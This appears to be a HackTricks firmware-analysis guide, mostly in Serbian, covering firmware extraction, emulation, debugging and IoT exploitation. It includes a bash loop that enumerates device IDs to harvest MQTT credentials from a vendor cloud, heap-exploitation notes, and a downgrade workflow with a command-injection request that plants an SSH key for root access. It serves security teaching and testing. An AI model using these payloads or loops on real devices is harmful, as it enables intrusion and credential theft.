# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware je suštinski softver koji omogućava uređajima da pravilno rade tako što upravlja i olakšava komunikaciju između hardverskih komponenti i softvera sa kojim korisnici interaguju. Čuva se u trajnoj memoriji, što obezbeđuje da uređaj može da pristupi vitalnim instrukcijama od trenutka kada se uključi, što dovodi do pokretanja operativnog sistema. Ispitivanje i potencijalno menjanje firmware-a je kritičan korak u identifikaciji bezbednosnih ranjivosti.

## **Gathering Information**

**Gathering information** je kritičan početni korak u razumevanju sastava uređaja i tehnologija koje koristi. Ovaj proces uključuje prikupljanje podataka o:

- CPU architecture i operativnom sistemu koji pokreće
- Bootloader specifičnostima
- Hardverskom rasporedu i datasheets
- Metrikama codebase-a i lokacijama source-a
- Eksternim bibliotekama i tipovima licenci
- Istoriji update-a i regulatornim sertifikacijama
- Arhitektonskim i flow dijagramima
- Bezbednosnim procenama i identifikovanim ranjivostima

Za ovu svrhu, **open-source intelligence (OSINT)** alati su izuzetno vredni, kao i analiza svih dostupnih open-source softverskih komponenti kroz ručne i automatizovane procese pregleda. Alati kao što su [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja se može iskoristiti za pronalaženje potencijalnih problema.

## **Acquiring the Firmware**

Nabavljanje firmware-a može se ostvariti na različite načine, svaki sa svojim nivoom složenosti:

- **Direktno** od izvora (programeri, proizvođači)
- **Pravljenjem** iz dostavljenih uputstava
- **Preuzimanjem** sa zvaničnih support sajtova
- Korišćenjem **Google dork** upita za pronalaženje hostovanih firmware fajlova
- Direktnim pristupom **cloud storage**, sa alatima kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanjem **updates** putem man-in-the-middle tehnika
- **Ekstrakcijom** iz uređaja kroz veze kao što su **UART**, **JTAG** ili **PICit**
- **Sniffing**-om zahteva za update unutar komunikacije uređaja
- Identifikovanjem i korišćenjem **hardcoded update endpoints**
- **Dumping**-om iz bootloader-a ili mreže
- **Uklanjanjem i čitanjem** storage čipa, kada sve drugo zakaže, uz korišćenje odgovarajućih hardverskih alata

### UART-only logs: force a root shell via U-Boot env in flash

Ako se UART RX ignoriše (samo logs), i dalje možete da prisilite init shell tako što ćete offline **izmeniti U-Boot environment blob**:

1. Dump SPI flash pomoću SOIC-8 klipse + programatora (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Pronađite U-Boot env partition, izmenite `bootargs` tako da uključuje `init=/bin/sh`, i **ponovo izračunajte U-Boot env CRC32** za blob.
3. Ponovo upišite samo env partition i restartujte; shell bi trebalo da se pojavi na UART.

Ovo je korisno na embedded uređajima gde je bootloader shell onemogućen, ali je env partition upisiv kroz eksterni pristup flash-u.

## Analyzing the firmware

Sada kada **imate firmware**, potrebno je da iz njega izdvojite informacije da biste znali kako da ga tretirate. Različiti alati koje možete koristiti za to:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Ako ne pronađeš mnogo sa tim alatima, proveri **entropy** slike pomoću `binwalk -E <bin>`; ako je entropy niska, verovatno nije enkriptovana. Ako je entropy visoka, verovatno je enkriptovana (ili na neki način kompresovana).

Takođe, možeš koristiti ove alate za izdvajanje **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) za pregled fajla.

### Getting the Filesystem

Sa prethodnim pomenutim alatima kao što je `binwalk -ev <bin>` trebalo bi da si uspeo da **extract the filesystem**.\
Binwalk obično to izdvaja unutar **folder named as the filesystem type**, koji je obično jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Ponekad binwalk **neće imati magic byte filesystema u svojim signatures**. U tim slučajevima, koristi binwalk da **find the offset of the filesystem and carve the compressed filesystem** iz binarnog fajla i **manually extract** filesystem prema njegovom tipu koristeći korake ispod.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Pokrenite sledeću **dd command** za carving Squashfs filesystema.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativno, sledeća komanda takođe može da se pokrene.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (korišćeno u gornjem primeru)

`$ unsquashfs dir.squashfs`

Datoteke će nakon toga biti u direktorijumu "`squashfs-root`".

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- Za ubifs filesystems sa NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza Firmware

Kada se firmware pribavi, neophodno je detaljno ga analizirati da bi se razumeli njegova struktura i potencijalne ranjivosti. Ovaj proces uključuje korišćenje raznih alata za analizu i izdvajanje vrednih podataka iz firmware image-a.

### Alati za početnu analizu

Skup komandi je dat za početni pregled binarne datoteke (nazvane `<bin>`). Ove komande pomažu u identifikaciji tipova datoteka, izdavanju strings, analizi binarnih podataka i razumevanju detalja particija i filesystem-a:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Da bi se procenio status enkripcije slike, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na nedostatak enkripcije, dok visoka entropija ukazuje na moguću enkripciju ili kompresiju.

Za izdvajanje **ugrađenih fajlova**, preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za inspekciju fajlova.

### Extracting the Filesystem

Koristeći `binwalk -ev <bin>`, obično se može izdvojiti filesystem, često u direktorijum nazvan po tipu filesystem-a (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip filesystem-a zbog nedostajućih magic bytes, neophodno je ručno izdvajanje. To uključuje korišćenje `binwalk` za lociranje offset-a filesystem-a, nakon čega se koristi `dd` komanda za izdvajanje filesystem-a:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Nakon toga, u zavisnosti od tipa filesystem-a (npr. squashfs, cpio, jffs2, ubifs), koriste se različite komande za ručno izvlačenje sadržaja.

### Analiza filesystem-a

Nakon što je filesystem izvučen, počinje pretraga za bezbednosnim propustima. Pažnja se posvećuje insecure network daemons, hardcoded credentials, API endpoints, update server funkcionalnostima, nekompajliranom kodu, startup skriptama i kompajliranim binary fajlovima za offline analizu.

**Ključne lokacije** i **stavke** za proveru uključuju:

- **etc/shadow** i **etc/passwd** za korisničke kredencijale
- SSL sertifikate i ključeve u **etc/ssl**
- Konfiguracione i script fajlove radi potencijalnih ranjivosti
- Embedded binary fajlove za dalju analizu
- Uobičajene web servere i binary fajlove za IoT uređaje

Nekoliko alata pomaže u otkrivanju osetljivih informacija i ranjivosti unutar filesystem-a:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmware-a
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Provere bezbednosti nad kompajliranim binary fajlovima

I source code i kompajlirani binary fajlovi pronađeni u filesystem-u moraju biti pažljivo pregledani radi ranjivosti. Alati poput **checksec.sh** za Unix binary fajlove i **PESecurity** za Windows binary fajlove pomažu da se identifikuju nezaštićeni binary fajlovi koji bi mogli biti iskorišćeni.

## Prikupljanje cloud config i MQTT kredencijala putem izvedenih URL tokena

Mnogi IoT hubs preuzimaju svoju konfiguraciju po uređaju sa cloud endpoint-a koji izgleda ovako:

- `https://<api-host>/pf/<deviceId>/<token>`

Tokom analize firmware-a možete otkriti da je `<token>` lokalno izveden iz device ID-a pomoću hardcoded secret-a, na primer:

- token = MD5( deviceId || STATIC_KEY ) i predstavljen kao uppercase hex

Ovaj dizajn omogućava svima koji saznaju deviceId i STATIC_KEY da rekonstruišu URL i preuzmu cloud config, često otkrivajući plaintext MQTT kredencijale i topic prefikse.

Praktični workflow:

1) Izvucite deviceId iz UART boot logova

- Povežite 3.3V UART adapter (TX/RX/GND) i zabeležite logove:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Potražite linije koje ispisuju cloud config URL pattern i broker address, na primer:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Povrati STATIC_KEY i token algoritam iz firmware-a

- Učitaj binarne fajlove u Ghidra/radare2 i potraži config path ("/pf/") ili MD5 usage.
- Potvrdi algoritam (npr. MD5(deviceId||STATIC_KEY)).
- Izvedi token u Bash i pretvori digest u uppercase:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Prikupi cloud konfiguraciju i MQTT kredencijale

- Sastavi URL i preuzmi JSON sa curl; parsiraj sa jq da izvučeš tajne:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Zloupotrebi plaintext MQTT i slabe topic ACL-ove (ako postoje)

- Iskoristi vraćene kredencijale da se pretplatiš na maintenance teme i tražiš osetljive događaje:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerisanje predvidljivih device ID-jeva (u velikom obimu, uz autorizaciju)

- Mnogi ekosistemi ugrađuju vendor OUI/product/type bajtove praćene sekvencijalnim sufiksom.
- Možete iterirati kroz kandidat ID-jeve, izvesti tokene i programatski preuzeti configs:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Napomene
- Uvek pribavi eksplicitnu autorizaciju pre pokušaja masovne enumeracije.
- Preferiraj emulaciju ili static analysis za oporavak tajni bez menjanja target hardware kada je to moguće.


Proces emulacije firmware omogućava **dynamic analysis** bilo rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na izazove sa hardware ili architecture zavisnostima, ali prebacivanje root filesystem-a ili specifičnih binary-ja na uređaj sa poklapanjem architecture i endianness, kao što je Raspberry Pi, ili na unapred napravljenu virtual machine, može olakšati dalje testiranje.

### Emulating Individual Binaries

Za ispitivanje pojedinačnih programa, identifikovanje endianness i CPU architecture programa je ključno.

#### Example with MIPS Architecture

Za emulaciju binary-ja sa MIPS architecture, može se koristiti komanda:
```bash
file ./squashfs-root/bin/busybox
```
I za instalaciju neophodnih alata za emulaciju:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

For ARM binaries, the process is similar, with the `qemu-arm` emulator being utilized for emulation.

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## Dynamic Analysis in Practice

At this stage, either a real or emulated device environment is used for analysis. It's essential to maintain shell access to the OS and filesystem. Emulation may not perfectly mimic hardware interactions, necessitating occasional emulation restarts. Analysis should revisit the filesystem, exploit exposed webpages and network services, and explore bootloader vulnerabilities. Firmware integrity tests are critical to identify potential backdoor vulnerabilities.

## Runtime Analysis Techniques

Runtime analysis involves interacting with a process or binary in its operating environment, using tools like gdb-multiarch, Frida, and Ghidra for setting breakpoints and identifying vulnerabilities through fuzzing and other techniques.

For embedded targets without a full debugger, **copy a statically-linked `gdbserver`** to the device and attach remotely:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

Na IoT hub-ovima RF stack je često podeljen između **radio MCU** i Linux userland procesa. Koristan workflow je da se mapira putanja:

1. **RF frame** na air
2. **controller-side parser** na radio MCU
3. **serial/UART text or TLV protocol** prosleđen Linux-u (na primer `/dev/tty*`)
4. **application dispatcher** u glavnom daemon-u
5. **protocol-specific handler / state machine**

Ova arhitektura stvara dva reversing target-a umesto jednog. Ako controller pretvara binarne radio frame-ove u textual protocol kao što je `Group,Command,arg1,arg2,...`, izdvoji:

- **message groups** i dispatch tables
- Koje poruke mogu doći iz **network** u odnosu na controller itself
- Tačna **manufacturer-specific discriminator fields** (na primer Zigbee `manufacturer_code` i custom `cluster_command`)
- Koji handler-i su dostupni samo tokom **commissioning**, discovery, ili firmware/model download faza

Za Zigbee posebno, uhvati pairing traffic i proveri da li target i dalje koristi default **Link Key** `ZigBeeAlliance09`. Ako da, sniffing commissioning traffic može otkriti **Network Key**. Zigbee 3.0 install codes smanjuju ovu izloženost, pa zabeleži da li testirani device zaista to enforce-uje.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands su često bolji target od standardizovanih cluster-a zato što hrane **custom parsing code** i interne **FSMs** sa manje proverenom validacijom.

Praktični workflow:

- Reversuj command dispatcher dok ne pronađeš **vendor-only handler**.
- Izdvoji **FSM state**, **event**, **check**, **action**, i **next-state** tables.
- Identifikuj **transitional states** koji auto-advance-uju i retry/error grane koje na kraju reset-uju ili free-ju attacker-controlled state.
- Potvrdi koji legitimni protocol exchanges su potrebni da bi se daemon doveo u vulnerable state, umesto da pretpostaviš da je buggy handler uvek reachable.

Za timing-sensitive protocols, packet replay iz Python framework-a može biti prespor. Pouzdaniji pristup je da emuliraš legitimni device na real hardware-u (na primer **nRF52840**) sa vendor-grade stack-om tako da možeš da izložiš ispravne **endpoints**, **attributes**, i commissioning timing.

### Fragmented-download bug class in embedded daemons

Ponavljajuća firmware bug klasa pojavljuje se u **fragmented blob/model/configuration downloads**:

1. **prvi fragment** (`offset == 0`) čuva `ctx->total_size` i alocira `malloc(total_size)`.
2. Kasniji fragmenti proveravaju samo attacker-controlled **packet-local** fields kao što su `packet_total_size >= offset + chunk_len`.
3. Copy koristi `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez provere prema **original allocated size**.

Ovo omogućava napadaču da pošalje:

- Prvi validan fragment sa **malim** declared total size da bi se naterala mala heap allocation.
- Kasniji fragment sa **očekivanim offset** ali većim `chunk_len`.
- Forged packet-local size koji zadovoljava sve sveže provere dok i dalje overflow-uje prvobitno alocirani buffer.

Kada je vulnerable path iza commissioning logike, exploitation mora da uključi dovoljno **device emulation** da bi target ušao u očekivani model-download ili blob-download state pre slanja malformed fragments.

### Protocol-driven `free()` triggers

U embedded daemons, najlakši način da se pokrene heap metadata exploitation često nije "sačekaj cleanup" već **forsiraj sopstveno error handling protokola**:

- Pošalji malformed follow-up fragments da bi se FSM gurnuo u **retry** ili **error** states.
- Prekorači retry threshold tako da daemon **resets context** i free-uje korumpirani buffer.
- Iskoristi ovaj predvidljiv `free()` da pokreneš allocator-side primitives pre nego što process padne iz nepovezanih razloga.

Ovo je posebno korisno protiv **musl/uClibc/dlmalloc-like** allocators u embedded Linux-u, gde korumpiranje chunk metadata može da pretvori unlink/unbin logic u write primitive. Stabilan pattern je da se korumpira **size field** kako bi se allocator traversal preusmerio u **fake chunks staged inside the overflowed buffer**, umesto da se odmah pregaze real bin pointers i sruši process.

## Binary Exploitation and Proof-of-Concept

Razvijanje PoC-a za identifikovane vulnerabilnosti zahteva duboko razumevanje target architecture i programiranje u lower-level languages. Binary runtime protections u embedded systems su retke, ali kada postoje, tehnike kao što je Return Oriented Programming (ROP) mogu biti neophodne.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc koristi fastbins slično glibc. Kasnija velika allocation može da pokrene `__malloc_consolidate()`, pa svaki fake chunk mora da prođe provere (sane size, `fd = 0`, i okolni chunk-ovi viđeni kao "in use").
- **Non-PIE binaries under ASLR:** ako je ASLR uključen ali je glavni binary **non-PIE**, in-binary `.data/.bss` adrese su stabilne. Možeš da targetiraš region koji već liči na valid heap chunk header kako bi fastbin allocation sleteo na **function pointer table**.
- **Parser-stopping NUL:** kada se JSON parsira, `\x00` u payload-u može da zaustavi parsing dok trailing attacker-controlled bytes ostaju za stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ROP chain koji poziva `open("/proc/self/mem")`, `lseek()`, i `write()` može da postavi executable shellcode u poznatom mapping-u i skoči na njega.

## Prepared Operating Systems for Firmware Analysis

Operating systems kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) pružaju prekonfigurisana okruženja za firmware security testing, opremljena potrebnim alatima.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distro namenjen da ti pomogne da radiš security assessment i penetration testing Internet of Things (IoT) uređaja. Štedi ti mnogo vremena tako što obezbeđuje prekonfigurisano okruženje sa svim potrebnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system baziran na Ubuntu 18.04, unapred opremljen firmware security testing alatima.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Čak i kada vendor implementira kriptografske signature provere za firmware image-ove, **version rollback (downgrade) protection** često izostaje. Kada boot- ili recovery-loader proverava samo signature uz embedded public key, ali ne poredi *version* (ili monotonic counter) image-a koji se flash-uje, napadač može legitimno da instalira **stariji, vulnerabilni firmware koji i dalje ima validan signature** i tako ponovo uvede patched vulnerabilities.

Tipičan attack workflow:

1. **Obtain an older signed image**
* Uzmite ga sa vendor-ovog javnog download portal-a, CDN-a ili support site-a.
* Izvucite ga iz companion mobile/desktop aplikacija (npr. unutar Android APK-a u `assets/firmware/`).
* Preuzmite ga iz third-party repositories kao što su VirusTotal, internet arhive, forumi, itd.
2. **Upload or serve the image to the device** kroz bilo koji izloženi update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, itd.
* Mnogi consumer IoT uređaji izlažu *unauthenticated* HTTP(S) endpoints koji prihvataju Base64-encoded firmware blob-ove, dekodiraju ih na server-side i pokreću recovery/upgrade.
3. Nakon downgrade-a, iskoristi vulnerabilnost koja je zakrpljena u novijem release-u (na primer command-injection filter koji je kasnije dodat).
4. Opcionalno flash-uj najnoviji image nazad ili disable updates da bi se izbeglo otkrivanje nakon što se postigne persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
U ranjivom (downgradovanom) firmware-u, `md5` parametar se direktno konkatenira u shell komandu bez sanitizacije, što omogućava injection proizvoljnih komandi (ovde – omogućavanje SSH key-based root access). Kasnije verzije firmware-a uvele su osnovni character filter, ali odsustvo downgrade protection čini ispravku bezvrednom.

### Extracting Firmware From Mobile Apps

Mnogi vendori pakuju kompletne firmware image-ove unutar svojih pratećih mobile applications, tako da app može da update-uje device preko Bluetooth/Wi-Fi. Ovi paketi se obično čuvaju nekriptovano u APK/APEX pod `assets/fw/` ili `res/raw/`. Alati kao što su `apktool`, `ghidra`, ili čak običan `unzip` omogućavaju vam da izvučete signed images bez diranja physical hardware-a.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Checklist za procenu logike ažuriranja

* Da li su transport/autentikacija *update endpoint*-a adekvatno zaštićeni (TLS + autentikacija)?
* Da li uređaj poredi **brojeve verzija** ili **monotonic anti-rollback counter** pre flashovanja?
* Da li se image verifikuje unutar secure boot chain-a (npr. signatures proveravaju ROM code)?
* Da li userland code vrši dodatne sanity checks (npr. dozvoljena partition map, model number)?
* Da li *partial* ili *backup* update flow-ovi ponovo koriste istu validation logic?

> 💡  Ako bilo šta od navedenog nedostaje, platforma je verovatno ranjiva na rollback attacks.

## Ranjivi firmware za vežbu

Za vežbu otkrivanja vulnerabilities u firmware-u, koristite sledeće vulnerable firmware projekte kao početnu tačku.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
